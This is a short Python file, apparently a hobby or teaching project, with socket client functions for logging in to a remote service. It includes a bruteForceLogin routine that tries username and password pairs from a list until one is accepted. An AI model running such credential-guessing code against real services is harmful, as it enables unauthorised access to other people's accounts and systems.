def loginGui(soc):
    while True:
        # entering the username
        print(soc.recv(1024).decode())  # receive response
        soc.sendall(input('').encode())

        # entering the password
        print(soc.recv(1024).decode())  # receive response
        soc.sendall(input('').encode())

        data = soc.recv(1024).decode()  # receive response
        print(data)  # show in terminal
        if data == "login successful":
            print("proceeding to system control")
            return 1

def login(soc, username, password):
    #entering the username
    data = soc.recv(1024).decode()  # receive response
    soc.sendall(username.encode())

    #entering the password
    data = soc.recv(1024).decode()  # receive response
    soc.sendall(password.encode())


    data = soc.recv(1024).decode()  # receive response
    print(data)  # show in terminal
    if data == "login successful":
        return 1
    return 0

def bruteForceLogin(soc, combinations):
    for comb in combinations:
        print(f"trying: username - {comb[0]}, password - {comb[1]}")
        res = login(soc, comb[0], comb[1])

        if res == 1:
            print(f"username and password found! username = {comb[0]}, password = {comb[1]}")
            return True

    print("no login combination found :(")
    return False